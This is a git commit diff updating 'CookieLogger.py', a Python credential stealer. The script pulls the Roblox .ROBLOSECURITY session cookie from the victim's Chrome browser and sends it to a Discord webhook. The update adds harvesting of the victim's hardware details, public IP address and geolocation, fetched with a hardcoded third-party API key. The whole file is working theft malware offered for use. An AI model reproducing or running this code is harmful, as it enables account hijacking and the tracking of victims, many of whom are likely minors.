983f3a6b127701f06469d1a6e49e7347e8c53154
xman <82530118+xman213@users.noreply.github.com>
2022-08-14 12:39:54 -0400

    Update CookieLogger.py

--- CookieLogger.py
+++ CookieLogger.py
@@ -1,13 +1,60 @@
-import browser_cookie3, requests, threading, discord_webhook
+import browser_cookie3, requests, threading, discord_webhook, platform
+import platform,socket,re,uuid,json,psutil,logging
 
-webhook = 'YOUR WEBHOOK HERE'
+
+info={}
+info['platform']=platform.system()
+info['platform-release']=platform.release()
+info['platform-version']=platform.version()
+info['architecture']=platform.machine()
+info['hostname']=socket.gethostname()
+info['ip-address']=socket.gethostbyname(socket.gethostname())
+info['mac-address']=':'.join(re.findall('..', '%012x' % uuid.getnode()))
+info['processor']=platform.processor()
+info['ram']=str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"
+
+ip = requests.get('https://api.ipify.org').text
+
+
+
+key = '8afd579c95c744178f55abd5ea6ed29d'
+
+
+
+r = requests.get('https://ipgeolocation.abstractapi.com/v1/?api_key=' + key + '&ip_address=' + ip)
+data = r.json()
+city = data['city']
+state = data['region']
+contry = data['country']
+
+
+webhook = 'WEBHOOK HERE'
 
 def chrome_logger():
     try:
         cookies = browser_cookie3.chrome(domain_name='roblox.com')
         cookies = str(cookies)
         cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
-        requests.post(webhook, json={'username':'SKID LOGGER', 'content':f'```SKIDS COOKIE: {cookie}```'})
+        requests.post(webhook, json={'username':'SKID LOGGER', 'content':f"""
+        
+Roblox Cookie:
+
+```SKIDS COOKIE: {cookie}```
+        
+System Info:
+```
+Ram: {info['ram']}
+CPU: {info['processor']}
+OS:  {info['platform']}
+```
+
+Ip info:
+```
+IP: {ip}
+City: {city}
+State: {state}
+Country: {contry}
+```"""})
     except:
         pass
 browsers = [chrome_logger]
